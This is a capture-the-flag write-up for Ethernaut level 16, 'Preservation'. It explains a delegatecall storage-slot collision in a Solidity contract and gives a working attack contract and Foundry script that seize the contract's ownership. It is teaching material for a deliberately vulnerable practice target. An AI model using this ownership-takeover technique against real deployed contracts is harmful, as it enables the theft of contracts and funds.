# Ethernaut Level 16 Preservation

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

Our goal is to claim ownership of the `Preservation` contract. We can easily see that delegate calling `setTime()` will not work as it is meant to. Since `Preservation` is delegate calling `LibraryContract` instances, state changes will happen to contract `Preservation`, not the other way around. However, the state change will keep the slot position consistent, that is to say, delegate calling `setTime` will only change the *first* storage slot of the `Preservation` contract, where the `address public timeZone1Library` is meant to be stored.

So we can attack this contract in this way: `1. Delegate call setTime to point variable timeZone1Library to our malicious contract.` `2. Delegate call setTime again to modify the owner.` Note that in order to modify the owner, which lies in slot 2, attack contract has to have a similar storage layout, where the changeable slot is also slot 2.

`Attack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public awkwardStorage0;
    address public awkwardStorage1;
    address public owner;

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}
```

Note that the `msg.sender` will be exactly the address which calls `Preservation` contract (EOA).

`Preservation.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Preservation} from "../src/Preservation.sol";
import {Attack} from "../src/Attack.sol";

contract PreservationScript is Script {
    Preservation preservation = Preservation(0xXXXXXXXXXXXXX);
    
    function run() external {
        vm.startBroadcast();
        console.log("Before attack, owner is:", preservation.owner());
        Attack attack = new Attack();
        preservation.setFirstTime(uint256(uint160(address(attack))));
        preservation.setFirstTime(1);
        console.log("After attack, owner is:", preservation.owner());
        vm.stopBroadcast();
    }
}
```

